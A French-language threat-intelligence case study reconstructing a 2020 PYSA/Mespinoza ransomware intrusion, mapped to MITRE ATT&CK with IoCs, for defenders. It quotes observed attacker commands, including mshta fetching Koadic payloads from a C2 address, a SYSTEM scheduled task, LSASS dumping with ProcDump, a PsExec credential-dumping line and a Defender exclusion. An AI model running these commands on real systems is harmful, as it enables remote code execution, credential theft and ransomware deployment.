# PYSA / Mespinoza - Étude de cas DFIR

👉🏾 [**English version available here**](./dfir_case_study.md)

**AFRINTEL Threat Actor Intelligence**

- **Acteur / Groupe :** PYSA / Mespinoza
- **Type de menace :** Ransomware / Double extorsion
- **Type d'analyse :** Reconstruction DFIR d'une intrusion
- **Durée de l'intrusion documentée :** ~8 heures
- **Source technique principale :** The DFIR Report
- **Date du rapport :** 23 novembre 2020
- **Niveau de confiance :** Élevé
- **Dernière mise à jour AFRINTEL :** 25 août 2026

---

## 1. Synthèse de l'incident

The DFIR Report a documenté une intrusion PYSA / Mespinoza ayant duré environ huit heures entre l'accès initial et le déploiement final du ransomware.

L'attaquant a obtenu un accès initial à un hôte Windows disposant d'un service RDP directement exposé à Internet, en utilisant un compte Domain Administrator valide.

Les connexions initiales et plusieurs relais d'accès ont été réalisés depuis trois nœuds de sortie Tor différents.

Après l'accès initial, l'acteur a rapidement :

1. effectué du mouvement latéral vers le contrôleur de domaine ;
2. déployé PowerShell Empire ;
3. réalisé plusieurs opérations de credential dumping ;
4. utilisé Koadic comme canal C2 supplémentaire ;
5. parcouru et collecté des données ;
6. préparé le déploiement du ransomware ;
7. chiffré les systèmes environ 7,5 heures après l'accès initial.

L'exfiltration n'a pas été directement observée en clair pendant l'intrusion. Elle a cependant été confirmée après le chiffrement, lorsque des documents canaris exfiltrés ont généré des callbacks depuis des nœuds de sortie Tor.

---

## 2. Chaîne d'attaque

### 2.1 Accès initial

- **T1133 – External Remote Services**
  - Service RDP directement exposé à Internet.

- **T1078 – Valid Accounts**
  - Utilisation d'un compte Domain Administrator valide.

- **T1021.001 – Remote Desktop Protocol**
  - Connexion interactive via RDP.

L'accès initial provenait d'un nœud de sortie Tor.

Au cours de l'intrusion, trois adresses IP appartenant au réseau Tor ont été utilisées successivement pour maintenir l'accès RDP.

**Preuve :** Observé  
**Confiance :** Élevée

---

### 2.2 Exécution et post-exploitation

#### PowerShell Empire

- **T1059.001 – PowerShell**
  - Déploiement d'un launcher PowerShell Empire quelques minutes après l'accès initial.

Empire est resté actif pendant toute l'intrusion et semble avoir servi de canal C2 secondaire ou de secours.

#### Koadic

- **T1218.005 – Mshta**
  - Lancement de Koadic via `mshta.exe`.

Exemples observés :

```text
mshta http://45.147.231.210:9999/8k6Mq
mshta http://45.147.231.210:9999/VtgyT
```

Koadic utilise notamment JScript / VBScript et Windows Script Host pour ses mécanismes d'exécution.

**Preuve :** Observé  
**Confiance :** Élevée

---

## 3. Persistance

- **T1053.005 – Scheduled Task/Job: Scheduled Task**
  - Koadic a créé une tâche planifiée exécutée à l'ouverture de session sous le contexte SYSTEM.

Commande observée :

```text
schtasks /create /tn K0adic /tr "C:\Windows\system32\mshta.exe C:\ProgramData\SZWXNUHHDP.hta" /sc onlogon /ru System /f
```

Le fichier HTA était stocké dans :

```text
C:\ProgramData\SZWXNUHHDP.hta
```

**Preuve :** Observé  
**Confiance :** Élevée

---

## 4. Credential Access

L'un des éléments les plus significatifs de l'intrusion est la multiplication des méthodes utilisées pour obtenir des identifiants.

### LSASS

- **T1003.001 – OS Credential Dumping: LSASS Memory**

Techniques observées :

- dump manuel de LSASS via le Gestionnaire des tâches ;
- dump LSASS via `comsvcs.dll` ;
- tentative d'utilisation de ProcDump ;
- exécution d'Invoke-Mimikatz.

Exemple ProcDump tenté :

```text
procdump.exe -accepteula -ma lsass.exe mem.dmp
```

Le rapport précise cependant que ProcDump n'était pas présent sur l'endpoint concerné : cette méthode a donc été **tentée**, mais pas exécutée avec succès sur cet hôte.

### comsvcs.dll

Un script PowerShell distribué via PsExec utilisait `comsvcs.dll` pour générer un dump de LSASS.

Cette méthode correspond également à :

- **T1218.011 – Rundll32**
- **T1003.001 – LSASS Memory**

### NTDS

- **T1003.003 – OS Credential Dumping: NTDS**

L'attaquant a créé et accédé à une Shadow Copy contenant `ntds.dit` sur le contrôleur de domaine.

L'événement Windows **Event ID 1917** a été observé lors de la création de la sauvegarde Shadow Copy d'Active Directory.

### Autres méthodes

Le rapport documente également :

- Invoke-Mimikatz ;
- extraction des LSA Secrets ;
- récupération et décodage de credentials depuis la base SQL du logiciel de sauvegarde ;
- utilisation du module Koadic `hashdump_sam`.

**Preuve :** Observé  
**Confiance :** Élevée

---

## 5. Discovery

L'acteur a utilisé de nombreux outils Windows natifs :

```text
quser.exe
whoami.exe /user
net.exe group /domain
net.exe group "Domain Users" /domain
nltest.exe /dclist:
arp -a
```

Techniques correspondantes :

- **T1087 – Account Discovery**
- **T1018 – Remote System Discovery**
- **T1482 – Domain Trust Discovery**
- **T1057 – Process Discovery**

Des outils supplémentaires ont également été utilisés :

- Advanced Port Scanner ;
- ADRecon.

L'attaquant a également consulté plusieurs consoles MMC liées à Active Directory, DNS, Group Policy, stockage et sauvegardes.

**Preuve :** Observé  
**Confiance :** Élevée

---

## 6. Mouvement latéral

### RDP

- **T1021.001 – Remote Desktop Protocol**

RDP a constitué le principal moyen de déplacement latéral.

Le premier pivot vers un contrôleur de domaine s'est produit seulement environ trois minutes après l'accès initial.

### PsExec

PsExec a ensuite été utilisé pour distribuer et exécuter un script PowerShell de credential dumping sur plusieurs systèmes.

Commande documentée :

```text
PsExec.exe -d \\HOST -u "DOMAIN\USER" -p "PASSWORD" -accepteula -s cmd /c "powershell.exe -ExecutionPolicy Bypass -file \\DOMAINCONTROLLER\share$\p.ps1"
```

Techniques associées :

- **T1569.002 – Service Execution**
- **T1021.002 – SMB/Windows Admin Shares**

**Preuve :** Observé  
**Confiance :** Élevée

---

## 7. Command & Control

Trois canaux C2 principaux ont été identifiés :

1. RDP ;
2. PowerShell Empire ;
3. Koadic.

### Infrastructure observée

#### RDP / Tor

```text
198.96.155.3
23.129.64.190
185.220.100.240
```

Ces trois adresses étaient identifiées comme nœuds de sortie Tor lors de l'incident.

#### Empire

```text
194.36.190.74:443
```

#### Koadic

```text
45.147.231.210:9999
```

**Important :** ces IoC sont historiques et datent de l'incident documenté en 2020. Ils ne doivent pas être utilisés comme indicateurs actifs actuels sans validation supplémentaire.

---

## 8. Exfiltration

- **T1041 – Exfiltration Over C2 Channel**

The DFIR Report indique qu'aucune exfiltration en clair n'a été directement observée pendant l'intrusion.

Cependant, après le déploiement du ransomware, des documents canaris présents dans l'environnement ont été ouverts depuis l'extérieur.

Les callbacks provenaient de nœuds de sortie Tor.

Cet élément confirme que des fichiers avaient quitté l'environnement.

La source estime que l'exfiltration a probablement été réalisée via l'un des canaux déjà contrôlés par l'attaquant :

- RDP ;
- Empire ;
- Koadic.

**Qualification AFRINTEL :**

- **Exfiltration de données : Confirmée**
- **Canal exact d'exfiltration : Évalué / Non confirmé**
- **Infrastructure finale d'exfiltration : Non établie**

**Confiance :**
- Exfiltration : Élevée
- Canal utilisé : Moyenne

---

## 9. Defense Evasion

L'acteur a activement désactivé ou contourné des mécanismes de sécurité.

Actions observées :

- désactivation de Windows Defender via Group Policy ;
- modification de `MpPreference` ;
- ajout d'une exclusion Defender pour les fichiers `.exe` ;
- arrêt de multiples processus liés à la sécurité, aux bases de données, aux sauvegardes et aux applications serveur.

Commande observée :

```powershell
Add-MpPreference -ExclusionExtension ".exe"
```

Des événements **Windows Defender Event ID 5007** ont été générés après modification de la configuration.

**Preuve :** Observé  
**Confiance :** Élevée

---

## 10. Impact

- **T1486 – Data Encrypted for Impact**

Environ 7,5 heures après l'accès initial, l'acteur a commencé le déploiement du ransomware.

Deux fichiers étaient déposés via RDP :

```text
C:\Users\USER\Downloads\svchost.exe
C:\Users\USER\Downloads\p.ps1
```

Le script PowerShell :

- désactivait des mécanismes de sécurité ;
- arrêtait plusieurs processus ;
- vérifiait / ouvrait RDP dans le pare-feu ;
- préparait l'hôte au chiffrement.

Le binaire PYSA était ensuite exécuté pour chiffrer le système.

**Preuve :** Observé  
**Confiance :** Élevée

---

## 11. IoC et artefacts techniques

### Infrastructure réseau

| Type | Valeur | Contexte |
|---|---|---|
| IPv4 | `198.96.155.3` | RDP / Tor exit |
| IPv4 | `23.129.64.190` | RDP / Tor exit |
| IPv4 | `185.220.100.240` | RDP / Tor exit |
| IPv4 | `45.147.231.210` | Koadic C2 |
| IPv4 | `194.36.190.74` | Empire C2 |

### Fichiers

```text
svchost.exe
p.ps1
XEKFGUIQQB.hta
```

### SHA-256 documentés

```text
df0cd6a8a67385ba67f9017a78d6582db422a137160176c2c5c3640b482b4a6c
eb1d0acd250d32e16fbfb04204501211ba2a80e34b7ec6260440b7d563410def
0ab8f14e2c1e6f7c4dfa3d697d935d4fbef3605e15fd0d489d39b7f82c84ba7e
81e0d5945ab7374caf2353f8d019873c88728a6c289884a723321b8a21df3c77
```

> Les IoC doivent être conservés avec leur date et leur contexte historique. Leur présence actuelle ne constitue pas, à elle seule, une attribution à PYSA.

---

## 12. Chronologie analytique simplifiée

```text
T+00:00   RDP exposé + compte Domain Admin valide
    │
T+00:03   Mouvement latéral vers Domain Controller
    │
    ├── Discovery
    ├── PowerShell Empire
    │
    ├── Credential Dumping
    │      ├── Task Manager → LSASS
    │      ├── comsvcs.dll → LSASS
    │      ├── Mimikatz
    │      └── NTDS.dit / Shadow Copy
    │
    ├── Koadic
    ├── RDP / PsExec
    ├── Collection de données
    ├── Defense Evasion
    │
T+~07:30  Déploiement PYSA
    │
    ▼
Chiffrement
    │
    ▼
Callbacks Canary Documents
    │
    ▼
Exfiltration confirmée
```

---

## 13. Évaluation AFRINTEL

Ce cas constitue un exemple particulièrement utile de reconstruction d'une intrusion ransomware complète.

Il démontre qu'une attribution technique ne doit pas être fondée uniquement sur le binaire ransomware final.

L'évaluation repose ici sur la corrélation de :

- accès RDP ;
- comptes compromis ;
- infrastructure Tor ;
- frameworks C2 ;
- PowerShell ;
- credential dumping ;
- mouvement latéral ;
- collecte ;
- exfiltration ;
- ransomware ;
- chronologie DFIR.

AFRINTEL classe les éléments de cette étude comme des **TTP documentées dans cet incident PYSA spécifique**.

Ils ne doivent pas être automatiquement appliqués à toutes les victimes PYSA suivies par AFRINTEL.

---

## 14. Source principale

- The DFIR Report - **PYSA/Mespinoza Ransomware**
- Publication : 23 novembre 2020
- Investigation : Case 1010
- MITRE ATT&CK mapping et IoC fournis par The DFIR Report
- Source : https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/

---

**AFRINTEL - African Cyber Threat Intelligence**
